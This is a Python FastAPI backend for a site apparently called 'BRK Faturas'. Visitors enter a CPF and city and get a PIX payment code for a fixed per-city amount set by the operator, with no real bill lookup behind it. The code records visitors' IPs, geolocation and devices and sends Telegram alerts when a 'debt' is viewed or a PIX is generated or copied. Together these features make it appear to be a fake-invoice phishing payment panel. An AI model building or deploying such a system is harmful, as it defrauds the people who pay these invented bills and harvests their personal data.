import os
import re
import logging
import unicodedata
from contextlib import suppress
from pathlib import Path
from datetime import datetime, timezone, timedelta

from fastapi import FastAPI, APIRouter, Request, HTTPException, Depends, Query
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import ASCENDING, DESCENDING, IndexModel
from pydantic import BaseModel
from typing import Optional, List
import bcrypt
import jwt
import uuid
import requests
import asyncio

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_ALGORITHM = "HS256"
logger = logging.getLogger("brk")
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------

def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")


def verify_password(plain: str, hashed: str) -> bool:
    return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))


def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]


def create_access_token(user_id: str, username: str) -> str:
    payload = {
        "sub": user_id,
        "username": username,
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)


async def get_current_user(request: Request) -> dict:
    auth_header = request.headers.get("Authorization", "")
    token = auth_header[7:] if auth_header.startswith("Bearer ") else None
    if not token:
        raise HTTPException(status_code=401, detail="Não autenticado")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        user = await db.users.find_one({"username": payload.get("username")})
        if not user:
            raise HTTPException(status_code=401, detail="Usuário não encontrado")
        return {"id": str(user["_id"]), "username": user["username"], "email": user.get("email"), "role": user.get("role", "admin")}
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Sessão expirada")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token inválido")

# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------

class LoginInput(BaseModel):
    username: str
    password: str


class SettingsInput(BaseModel):
    chave_pix: str = ""
    tipo_chave: str = "aleatoria"
    nome_beneficiario: str = ""
    cidade: str = ""
    valor_padrao: float = 0.0
    valores_por_cidade: List[dict] = []
    telegram_bot_token: str = ""
    telegram_chat_id: str = ""
    notificacoes_ativas: bool = False
    notify_pix_gerado: bool = True
    notify_pix_copiado: bool = True
    notify_acesso: bool = False


class ConsultaInput(BaseModel):
    documento: str
    cidade: str = ""


class AcessoInput(BaseModel):
    page: str = "home"
    cidade: str = ""


class PixCopiadoInput(BaseModel):
    id: str


class LeadInput(BaseModel):
    documento: str = ""
    cidade: str = ""
    session_id: str = ""


class GerarInput(BaseModel):
    documento: str
    cidade: str = ""
    valor: float
    meses: List[str] = []
    session_id: str = ""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def start_of_today_utc() -> datetime:
    n = datetime.now(timezone.utc)
    return n.replace(hour=0, minute=0, second=0, microsecond=0)


def strip_accents(text: str) -> str:
    nfkd = unicodedata.normalize("NFKD", text or "")
    return "".join(c for c in nfkd if not unicodedata.combining(c))


def parse_device(ua: str) -> str:
    ua = ua or ""
    return "mobile" if any(k in ua for k in ("Mobile", "Android", "iPhone", "iPad")) else "desktop"


def parse_browser(ua: str) -> str:
    ua = ua or ""
    for name, key in [("Edge", "Edg"), ("Chrome", "Chrome"), ("Firefox", "Firefox"), ("Safari", "Safari")]:
        if key in ua:
            return name
    return "Outro"


def parse_os(ua: str) -> str:
    ua = ua or ""
    if "Windows NT" in ua:
        return "Windows"
    if any(k in ua for k in ("iPhone", "iPad", "iPod")):
        return "iOS"
    if "Android" in ua:
        return "Android"
    if "Mac OS X" in ua or "Macintosh" in ua:
        return "macOS"
    if "Linux" in ua:
        return "Linux"
    return "Outro"


def _is_private_ip(ip: str) -> bool:
    if not ip or ip in ("::1", "localhost"):
        return True
    return ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
                          "172.19.", "172.2", "172.30.", "172.31.", "::", "fc", "fd"))


async def geolocate(ip: str) -> str:
    if _is_private_ip(ip):
        return ""

    def _fetch():
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}",
                params={"fields": "status,country,regionName,city"},
                timeout=3,
            )
            d = r.json()
            if d.get("status") == "success":
                parts = [d.get("city"), d.get("regionName"), d.get("country")]
                return ", ".join([p for p in parts if p])
        except (requests.RequestException, ValueError):
            return ""
        return ""

    try:
        return await asyncio.to_thread(_fetch)
    except Exception:
        return ""

# ---------------------------------------------------------------------------
# PIX BR Code (EMV) generator — static PIX with amount, payable by any bank app
# ---------------------------------------------------------------------------

def _emv(tag: str, value: str) -> str:
    return f"{tag}{len(value):02d}{value}"


def _crc16(payload: str) -> int:
    crc = 0xFFFF
    for byte in payload.encode("utf-8"):
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc


def gen_pix_brcode(chave: str, nome: str, cidade: str, valor: float, txid: str) -> str:
    nome = (strip_accents(nome) or "BRK FATURAS").upper()[:25]
    cidade = (strip_accents(cidade) or "SAO PAULO").upper()[:15]
    txid = re.sub(r"[^A-Za-z0-9]", "", txid or "")[:25] or "***"

    maai = _emv("00", "br.gov.bcb.pix") + _emv("01", chave.strip())
    payload = (
        _emv("00", "01")
        + _emv("01", "11")
        + _emv("26", maai)
        + _emv("52", "0000")
        + _emv("53", "986")
        + _emv("54", f"{valor:.2f}")
        + _emv("58", "BR")
        + _emv("59", nome)
        + _emv("60", cidade)
        + _emv("62", _emv("05", txid))
    )
    payload += "6304"
    return payload + f"{_crc16(payload):04X}"


def compute_valor_cidade(s: dict, cidade: str) -> float:
    vmap = {}
    for item in (s.get("valores_por_cidade") or []):
        c = strip_accents((item.get("cidade") or "")).strip().lower()
        if c:
            try:
                vmap[c] = float(item.get("valor") or 0)
            except (TypeError, ValueError):
                pass
    key = strip_accents(cidade or "").strip().lower()
    if key and key in vmap:
        return vmap[key]
    try:
        return float(s.get("valor_padrao") or 0)
    except (TypeError, ValueError):
        return 0.0

# ---------------------------------------------------------------------------
# Activity / counters
# ---------------------------------------------------------------------------

async def trim_activities():
    total = await db.activities.count_documents({})
    if total > 500:
        olds = await db.activities.find({}, {"_id": 1}).sort("created_at", ASCENDING).limit(total - 500).to_list(total - 500)
        await db.activities.delete_many({"_id": {"$in": [o["_id"] for o in olds]}})


async def bump_click(page: str):
    today = start_of_today_utc().date().isoformat()
    doc = await db.counters.find_one({"_id": "main"}) or {}
    if doc.get("today_date") != today:
        await db.counters.update_one({"_id": "main"}, {"$set": {
            "today_date": today, "clicks_home_today": 0, "clicks_faturas_today": 0,
        }}, upsert=True)
    field = "clicks_home" if page == "home" else "clicks_faturas"
    await db.counters.update_one({"_id": "main"}, {"$inc": {f"{field}_total": 1, f"{field}_today": 1}}, upsert=True)


async def add_activity(doc: dict):
    doc["id"] = str(uuid.uuid4())
    doc["created_at"] = now_iso()
    await db.activities.insert_one(doc)
    await trim_activities()


async def notify_telegram(event_type: str, text: str):
    """Fire a Telegram message if notifications are enabled for this event type."""
    s = await db.settings.find_one({"_id": "main"}) or {}
    if not s.get("notificacoes_ativas"):
        return
    flag = {
        "pix_gerado": "notify_pix_gerado",
        "pix_copiado": "notify_pix_copiado",
        "acesso": "notify_acesso",
    }.get(event_type)
    if flag and not s.get(flag, False):
        return
    token = (s.get("telegram_bot_token") or "").strip()
    chat_id = (s.get("telegram_chat_id") or "").strip()
    if not token or not chat_id:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=8,
        )
    except requests.RequestException as exc:
        logger.warning("Telegram falhou: %s", exc)

# ---------------------------------------------------------------------------
# Seed admin
# ---------------------------------------------------------------------------

async def seed_admin():
    username = os.environ.get("ADMIN_USERNAME", "donas")
    password = os.environ.get("ADMIN_PASSWORD", "")
    existing = await db.users.find_one({"username": username})
    if existing is None and password:
        await db.users.insert_one({
            "username": username,
            "password_hash": hash_password(password),
            "email": os.environ.get("ADMIN_EMAIL", ""),
            "role": "admin",
            "created_at": now_iso(),
        })
        logger.info("Admin '%s' criado.", username)

# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------

app = FastAPI()
api = APIRouter(prefix="/api")


@api.get("/")
async def root():
    return {"message": "BRK Faturas API"}


# ------------------------------- Auth --------------------------------------

@api.post("/auth/login")
async def login(data: LoginInput):
    user = await db.users.find_one({"username": data.username})
    if not user or not verify_password(data.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")
    token = create_access_token(str(user["_id"]), user["username"])
    return {"token": token, "user": {"username": user["username"], "email": user.get("email"), "role": user.get("role", "admin")}}


@api.get("/auth/me")
async def me(current=Depends(get_current_user)):
    return current


# ------------------------------ Public -------------------------------------

@api.get("/public/info")
async def public_info():
    s = await db.settings.find_one({"_id": "main"}) or {}
    cidades = []
    for item in (s.get("valores_por_cidade") or []):
        c = (item.get("cidade") or "").strip()
        if c:
            try:
                cidades.append({"cidade": c, "valor": float(item.get("valor") or 0)})
            except (TypeError, ValueError):
                pass
    return {
        "beneficiario": s.get("nome_beneficiario") or "",
        "pagamento_disponivel": bool((s.get("chave_pix") or "").strip()),
        "valor_padrao": float(s.get("valor_padrao") or 0),
        "cidades": cidades,
    }


@api.post("/public/acesso")
async def public_acesso(data: AcessoInput, request: Request):
    page = data.page if data.page in ("home", "faturas") else "home"
    await bump_click(page)
    ua = request.headers.get("user-agent", "")
    ip = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
          or (request.client.host if request.client else ""))
    device = parse_device(ua)
    so = parse_os(ua)
    location = await geolocate(ip)
    await db.clicks.insert_one({
        "page": page,
        "cidade": data.cidade or "",
        "device": device,
        "navegador": parse_browser(ua),
        "so": so,
        "location": location,
        "ip": ip,
        "user_agent": ua,
        "created_at": now_iso(),
    })
    label = "Página inicial" if page == "home" else "Página de faturas"
    local_txt = location or (data.cidade or "Site público")
    await add_activity({
        "type": f"acesso_{page}",
        "title": f"Novo acesso · {label}",
        "subtitle": local_txt,
        "device": device,
        "so": so,
        "location": location,
    })
    dispositivo_txt = "Celular" if device == "mobile" else "Computador"
    await notify_telegram("acesso", f"👀 Novo acesso ao site · {label}\n📍 {local_txt}\n📱 {dispositivo_txt} · {so}")
    return {"ok": True}


@api.post("/public/consulta")
async def public_consulta(data: ConsultaInput, request: Request):
    s = await db.settings.find_one({"_id": "main"}) or {}
    chave = (s.get("chave_pix") or "").strip()
    if not chave:
        raise HTTPException(status_code=503, detail="Pagamento indisponível no momento. Tente mais tarde.")

    documento = re.sub(r"\D", "", data.documento or "")
    if len(documento) < 11:
        raise HTTPException(status_code=400, detail="Informe um CPF válido (11 dígitos).")
    documento = documento[:11]

    valor = compute_valor_cidade(s, data.cidade)
    if valor <= 0:
        raise HTTPException(status_code=400, detail="Nenhum débito disponível para esta cidade.")

    ua = request.headers.get("user-agent", "")
    pix_code = gen_pix_brcode(chave, s.get("nome_beneficiario", ""), s.get("cidade", ""), valor, documento)
    fat = {
        "id": str(uuid.uuid4()),
        "documento": documento,
        "valor": round(valor, 2),
        "status": "gerado",
        "qr_copiado": False,
        "pix_copiado": False,
        "cidade": data.cidade or "",
        "device": parse_device(ua),
        "navegador": parse_browser(ua),
        "pix_code": pix_code,
        "origem": "site_publico",
        "created_at": now_iso(),
    }
    await db.faturas.insert_one(fat)
    await add_activity({
        "type": "pix_gerado",
        "title": f"PIX gerado · Doc {documento}",
        "subtitle": data.cidade or "Site público",
        "valor": fat["valor"],
        "documento": documento,
        "device": fat["device"],
    })
    await notify_telegram("pix_gerado", f"🧾 <b>PIX gerado</b>\nDoc: {documento}\nValor: R$ {fat['valor']:.2f}\nCidade: {data.cidade or '-'}")
    return {"fatura": {k: v for k, v in fat.items() if k != "_id"}, "pix_code": pix_code}


@api.post("/public/lead")
async def public_lead(data: LeadInput, request: Request):
    documento = re.sub(r"\D", "", data.documento or "")[:14]
    sid = (data.session_id or "")[:64]
    ua = request.headers.get("user-agent", "")
    ip = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
          or (request.client.host if request.client else ""))
    device = parse_device(ua)
    so = parse_os(ua)
    location = await geolocate(ip)

    # Sempre registra a visualização de débitos (independente da fatura já existir)
    if documento:
        await add_activity({
            "type": "acesso_faturas",
            "title": f"Débitos Visualizado - Usuário {documento}",
            "subtitle": location or (data.cidade or "Site público"),
            "documento": documento,
            "device": device,
            "so": so,
            "location": location,
        })
        dispositivo_txt = "Celular" if device == "mobile" else "Computador"
        await notify_telegram(
            "acesso",
            f"📄 <b>Débitos Visualizado</b>\nUsuário: {documento}\n📍 {location or (data.cidade or '-')}\n📱 {dispositivo_txt} · {so}",
        )

    # Dedup apenas da FATURA por sessão
    if sid:
        existing = await db.faturas.find_one({"session_id": sid})
        if existing:
            return {"ok": True}
    fat = {
        "id": str(uuid.uuid4()),
        "session_id": sid,
        "documento": documento,
        "valor": 0.0,
        "meses": [],
        "status": "aguardando",
        "qr_copiado": False,
        "pix_copiado": False,
        "cidade": data.cidade or "",
        "device": device,
        "navegador": parse_browser(ua),
        "pix_code": "",
        "origem": "site_publico",
        "created_at": now_iso(),
    }
    await db.faturas.insert_one(fat)
    return {"ok": True}


@api.post("/public/gerar")
async def public_gerar(data: GerarInput, request: Request):
    s = await db.settings.find_one({"_id": "main"}) or {}
    chave = (s.get("chave_pix") or "").strip()
    if not chave:
        raise HTTPException(status_code=503, detail="Pagamento indisponível no momento. Tente mais tarde.")

    documento = re.sub(r"\D", "", data.documento or "")
    if len(documento) not in (11, 14):
        raise HTTPException(status_code=400, detail="Documento inválido.")

    valor = round(float(data.valor or 0), 2)
    if valor <= 0:
        raise HTTPException(status_code=400, detail="Valor inválido.")

    ua = request.headers.get("user-agent", "")
    pix_code = gen_pix_brcode(chave, s.get("nome_beneficiario", ""), s.get("cidade", ""), valor, documento)
    sid = (data.session_id or "")[:64]
    existing = await db.faturas.find_one({"session_id": sid}) if sid else None

    if existing:
        updates = {
            "documento": documento,
            "valor": valor,
            "meses": data.meses or [],
            "status": "gerado",
            "qr_copiado": True,
            "cidade": data.cidade or existing.get("cidade", ""),
            "device": parse_device(ua),
            "navegador": parse_browser(ua),
            "pix_code": pix_code,
        }
        await db.faturas.update_one({"id": existing["id"]}, {"$set": updates})
        fat = {**{k: v for k, v in existing.items() if k != "_id"}, **updates}
    else:
        fat = {
            "id": str(uuid.uuid4()),
            "session_id": sid,
            "documento": documento,
            "valor": valor,
            "meses": data.meses or [],
            "status": "gerado",
            "qr_copiado": True,
            "pix_copiado": False,
            "cidade": data.cidade or "",
            "device": parse_device(ua),
            "navegador": parse_browser(ua),
            "pix_code": pix_code,
            "origem": "site_publico",
            "created_at": now_iso(),
        }
        await db.faturas.insert_one(fat)
    await add_activity({
        "type": "pix_gerado",
        "title": f"PIX gerado · Doc {documento}",
        "subtitle": data.cidade or "Site público",
        "valor": valor,
        "documento": documento,
        "device": fat["device"],
    })
    await notify_telegram("pix_gerado", f"🧾 <b>PIX gerado</b>\nDoc: {documento}\nValor: R$ {valor:.2f}\nCidade: {data.cidade or '-'}")
    return {"fatura": {k: v for k, v in fat.items() if k != "_id"}, "pix_code": pix_code}


@api.post("/public/pix-copiado")
async def public_pix_copiado(data: PixCopiadoInput):
    fat = await db.faturas.find_one({"id": data.id})
    if not fat:
        raise HTTPException(status_code=404, detail="Fatura não encontrada")
    if not fat.get("pix_copiado"):
        await db.faturas.update_one({"id": data.id}, {"$set": {"pix_copiado": True, "status": "copiado"}})
        await add_activity({
            "type": "pix_copiado",
            "title": f"PIX copiado · Doc {fat['documento']}",
            "subtitle": fat.get("cidade") or "Site público",
            "valor": fat.get("valor"),
            "documento": fat["documento"],
            "device": fat.get("device"),
        })
        await notify_telegram("pix_copiado", f"✅ <b>PIX copiado</b>\nDoc: {fat['documento']}\nValor: R$ {float(fat.get('valor') or 0):.2f}")
    return {"ok": True}


# ----------------------------- Dashboard -----------------------------------

async def compute_stats():
    today = start_of_today_utc().isoformat()
    total_faturas = await db.faturas.count_documents({})
    total_faturas_hoje = await db.faturas.count_documents({"created_at": {"$gte": today}})
    qr_total = await db.faturas.count_documents({"qr_copiado": True})
    qr_hoje = await db.faturas.count_documents({"qr_copiado": True, "created_at": {"$gte": today}})

    async def sum_valor(match):
        cur = db.faturas.aggregate([{"$match": match}, {"$group": {"_id": None, "s": {"$sum": "$valor"}}}])
        rows = await cur.to_list(1)
        return round(rows[0]["s"], 2) if rows else 0.0

    pag_total = await sum_valor({})
    pag_hoje = await sum_valor({"created_at": {"$gte": today}})
    pix_total = await sum_valor({"pix_copiado": True})
    pix_hoje = await sum_valor({"pix_copiado": True, "created_at": {"$gte": today}})

    counters = await db.counters.find_one({"_id": "main"}) or {}
    today_date = start_of_today_utc().date().isoformat()
    ch_today = counters.get("clicks_home_today", 0) if counters.get("today_date") == today_date else 0
    cf_today = counters.get("clicks_faturas_today", 0) if counters.get("today_date") == today_date else 0

    return {
        "total_pagamentos_gerados": total_faturas,
        "total_pagamentos_gerados_hoje": total_faturas_hoje,
        "total_qr_copiados": qr_total,
        "total_qr_copiados_hoje": qr_hoje,
        "total_pagamentos_rs": pag_total,
        "total_pagamentos_rs_hoje": pag_hoje,
        "total_pix_copiados_rs": pix_total,
        "total_pix_copiados_rs_hoje": pix_hoje,
        "clicks_home": counters.get("clicks_home_total", 0),
        "clicks_home_hoje": ch_today,
        "clicks_faturas": counters.get("clicks_faturas_total", 0),
        "clicks_faturas_hoje": cf_today,
    }


async def compute_chart():
    now = datetime.now(timezone.utc)
    dias_pt = ["Dom", "Seg", "Ter", "Qua", "Qui", "Sex", "Sáb"]
    out = []
    best = {"label": "-", "valor": 0}
    total7 = 0.0
    for off in range(6, -1, -1):
        day = (now - timedelta(days=off)).replace(hour=0, minute=0, second=0, microsecond=0)
        nxt = day + timedelta(days=1)
        cur = db.faturas.aggregate([
            {"$match": {"created_at": {"$gte": day.isoformat(), "$lt": nxt.isoformat()}}},
            {"$group": {"_id": None, "s": {"$sum": "$valor"}}},
        ])
        rows = await cur.to_list(1)
        valor = round(rows[0]["s"], 2) if rows else 0.0
        label = dias_pt[(day.weekday() + 1) % 7]
        out.append({"dia": label, "valor": valor})
        total7 += valor
        if valor > best["valor"]:
            best = {"label": label, "valor": valor}
    return {"data": out, "total7": round(total7, 2), "melhor_dia": best}


@api.get("/dashboard/overview")
async def overview(current=Depends(get_current_user)):
    stats = await compute_stats()
    chart = await compute_chart()
    activities = await db.activities.find({}, {"_id": 0}).sort("created_at", DESCENDING).limit(30).to_list(30)
    recentes = await db.faturas.find({}, {"_id": 0}).sort("created_at", DESCENDING).limit(8).to_list(8)
    return {"stats": stats, "chart": chart, "activities": activities, "recentes": recentes}


@api.get("/dashboard/clicks")
async def dashboard_clicks(
    current=Depends(get_current_user),
    page: str = Query("home"),
    limit: int = Query(50, ge=1, le=200),
):
    page = page if page in ("home", "faturas") else "home"
    q = {"page": page}
    rows = await db.clicks.find(q, {"_id": 0}).sort("created_at", DESCENDING).limit(limit).to_list(limit)
    return {"clicks": rows, "total": await db.clicks.count_documents(q)}


@api.get("/faturas")
async def listar_faturas(
    current=Depends(get_current_user),
    search: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=500),
):
    q: dict = {}
    if status and status != "todos":
        q["status"] = status
    if search:
        q["documento"] = {"$regex": search, "$options": "i"}
    rows = await db.faturas.find(q, {"_id": 0}).sort("created_at", DESCENDING).limit(limit).to_list(limit)
    return {"faturas": rows, "total": await db.faturas.count_documents(q)}


@api.get("/activities")
async def listar_activities(current=Depends(get_current_user), limit: int = Query(30, ge=1, le=100)):
    rows = await db.activities.find({}, {"_id": 0}).sort("created_at", DESCENDING).limit(limit).to_list(limit)
    return {"activities": rows}


# ----------------------------- Settings ------------------------------------

@api.get("/settings")
async def get_settings(current=Depends(get_current_user)):
    doc = await db.settings.find_one({"_id": "main"}, {"_id": 0})
    return doc or SettingsInput().model_dump()


@api.put("/settings")
async def put_settings(data: SettingsInput, current=Depends(get_current_user)):
    await db.settings.update_one({"_id": "main"}, {"$set": {**data.model_dump(), "updated_at": now_iso()}}, upsert=True)
    return {"ok": True, "settings": data.model_dump()}


@api.post("/settings/telegram/test")
async def telegram_test(current=Depends(get_current_user)):
    s = await db.settings.find_one({"_id": "main"}) or {}
    token = (s.get("telegram_bot_token") or "").strip()
    chat_id = (s.get("telegram_chat_id") or "").strip()
    if not token or not chat_id:
        raise HTTPException(status_code=400, detail="Configure o token do bot e o Chat ID antes de testar.")
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": "✅ Painel conectado! Notificação de teste enviada com sucesso.", "parse_mode": "HTML"},
            timeout=10,
        )
        data = resp.json()
    except requests.RequestException as exc:
        raise HTTPException(status_code=502, detail=f"Falha ao contatar o Telegram: {exc}")
    if not data.get("ok"):
        raise HTTPException(status_code=400, detail=f"Telegram: {data.get('description', 'erro desconhecido')}")
    return {"ok": True}


app.include_router(api)

_cors_origins = os.environ.get('CORS_ORIGINS', '*').split(',')
app.add_middleware(
    CORSMiddleware,
    allow_credentials='*' not in _cors_origins,
    allow_origins=_cors_origins,
    allow_methods=["*"],
    allow_headers=["*"],
)

INDEXES = {
    "users": [IndexModel([("username", ASCENDING)], name="username", unique=True)],
    "faturas": [IndexModel([("created_at", DESCENDING)], name="created_at_desc"), IndexModel([("status", ASCENDING)], name="status"), IndexModel([("id", ASCENDING)], name="fatura_id")],
    "activities": [IndexModel([("created_at", DESCENDING)], name="created_at_desc")],
}


async def ensure_indexes():
    for coll, models in INDEXES.items():
        for m in models:
            with suppress(Exception):
                await db[coll].create_indexes([m])


@app.on_event("startup")
async def startup():
    await ensure_indexes()
    await seed_admin()
    with suppress(Exception):
        await db.faturas.update_many({"status": "pendente", "pix_copiado": True}, {"$set": {"status": "copiado"}})
        await db.faturas.update_many({"status": "pendente"}, {"$set": {"status": "gerado"}})


@app.on_event("shutdown")
async def shutdown():
    client.close()
